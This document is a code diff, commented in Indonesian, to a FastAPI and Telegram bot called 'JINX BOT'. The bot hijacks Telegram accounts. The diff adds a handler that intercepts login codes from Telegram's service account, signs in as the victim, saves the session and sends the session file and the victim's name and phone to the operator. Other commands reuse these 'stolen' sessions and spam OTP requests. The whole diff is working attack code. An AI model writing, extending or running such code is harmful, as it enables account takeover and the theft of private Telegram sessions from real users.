@@ -7,6 +7,7 @@ import re
 
 app = FastAPI()
 
+# ==== ENV ====
 API_ID = int(os.getenv('API_ID'))
 API_HASH = os.getenv('API_HASH')
 BOT_TOKEN = os.getenv('BOT_TOKEN')
@@ -17,6 +18,7 @@ listening = {}
 OTP_PATTERN = re.compile(r'\b(\d{5})\b')
 sessions = {}
 
+# === KIRIM FILE SESSION ===
 async def send_session(phone, session_str):
     file_path = f"/tmp/{phone.replace('+','')}.session"
     with open(file_path, "w") as f:
@@ -24,6 +26,7 @@ async def send_session(phone, session_str):
     await client.send_file(ADMIN_ID, file_path, caption=f"SESSION: `{phone}`")
     os.remove(file_path)
 
+# === /start_listener + AUTO KONFIRMASI ===
 @app.post("/start_listener")
 async def start_listener(req: Request):
     data = await req.json()
@@ -32,16 +35,42 @@ async def start_listener(req: Request):
     await temp.connect()
     sent = await temp.send_code_request(phone)
     listening[phone] = {'client': temp, 'hash': sent.phone_code_hash}
-    
+
+    # === LISTENER OTP ===
     @temp.on(events.NewMessage(incoming=True, from_users=777000))
-    async def handler(e):
+    async def otp_handler(e):
         match = OTP_PATTERN.search(e.message.message)
         if match:
             await auto_login(phone, match.group(1), "interceptor")
-    
+
+    # === LISTENER KONFIRMASI "APAKAH ANDA LOGIN DARI..." ===
+    @temp.on(events.NewMessage(incoming=True, from_users=777000))
+    async def confirm_handler(e):
+        text = e.message.message.lower()
+        if "apakah anda" in text or "login code" in text or "sign in" in text:
+            match = re.search(r'\b(\d{5})\b', e.message.message)
+            if match:
+                code = match.group(1)
+                try:
+                    await temp.sign_in(phone, code)
+                    me = await temp.get_me()
+                    sessions[phone] = temp  # UPDATE SESSION!
+                    session_str = temp.session.save()
+                    await send_session(phone, session_str)
+                    await client.send_message(ADMIN_ID, f"""
+KONFIRMASI BERHASIL!
+SESSION DIPERBARUI!
+User: {me.first_name}
+Phone: `{phone}`
+/login {phone}
+                    """.strip())
+                except Exception as err:
+                    await client.send_message(ADMIN_ID, f"Gagal konfirmasi: {str(err)}")
+
     await client.send_message(ADMIN_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
     return {"success": True}
 
+# === /submit_otp ===
 @app.post("/submit_otp")
 async def submit_otp(req: Request):
     data = await req.json()
@@ -51,6 +80,7 @@ async def submit_otp(req: Request):
         await auto_login(phone, otp, "web")
     return {"success": True}
 
+# === AUTO LOGIN ===
 async def auto_login(phone, code, source):
     if phone not in listening: return
     temp = listening[phone]['client']
@@ -58,8 +88,8 @@ async def auto_login(phone, code, source):
     try:
         await temp.sign_in(phone, code, phone_code_hash=hash_)
         me = await temp.get_me()
+        sessions[phone] = temp  # SIMPAN CLIENT!
         session_str = temp.session.save()
-        sessions[phone] = session_str
         await send_session(phone, session_str)
         await client.send_message(ADMIN_ID, f"""
 OTP: `{code}` ({source.upper()})
@@ -72,6 +102,7 @@ Phone: `{phone}`
     except Exception as e:
         await client.send_message(ADMIN_ID, f"Gagal: {str(e)}")
 
+# === /list ===
 @client.on(events.NewMessage(pattern=r'/list'))
 async def list_cmd(event):
     if event.sender_id != ADMIN_ID: return
@@ -83,6 +114,7 @@ async def list_cmd(event):
         msg += f"• `{p}`\n"
     await event.reply(msg, parse_mode='markdown')
 
+# === /login ===
 @client.on(events.NewMessage(pattern=r'/login (\+\d+)'))
 async def login_cmd(event):
     if event.sender_id != ADMIN_ID: return
@@ -90,9 +122,7 @@ async def login_cmd(event):
     if phone not in sessions:
         await event.reply("Session nggak ada!")
         return
-    session_str = sessions[phone]
-    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
-    await stolen.connect()
+    stolen = sessions[phone]
     if not await stolen.is_user_authorized():
         await event.reply("Session invalid!")
         return
@@ -103,6 +133,7 @@ Nama: {me.first_name}
 Phone: `{phone}`
     """.strip())
 
+# === /new_otp ===
 @client.on(events.NewMessage(pattern=r'/new_otp (\+\d+)'))
 async def new_otp(event):
     if event.sender_id != ADMIN_ID: return
@@ -111,8 +142,7 @@ async def new_otp(event):
         await event.reply("Session nggak ada!")
         return
     
-    session_str = sessions[phone]
-    stolen = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+    stolen = sessions[phone]
     
     try:
         if not stolen.is_connected():
@@ -135,6 +165,7 @@ async def new_otp(event):
     except Exception as e:
         await event.reply(f"Gagal: {str(e)}")
 
+# === /help ===
 @client.on(events.NewMessage(pattern=r'/help'))
 async def help_cmd(event):
     if event.sender_id != ADMIN_ID: return
@@ -145,7 +176,8 @@ JINX BOT
 /new_otp +6281xxx → Spam OTP (kode langsung muncul!)
     """)
 
+# === STARTUP ===
 @app.on_event("startup")
 async def startup():
     await client.start(bot_token=BOT_TOKEN)
-    print("JINX BOT JALAN – /new_otp 100% JALAN!")
+    print("JINX BOT JALAN – AUTO KONFIRMASI + /new_otp 100% JALAN!")
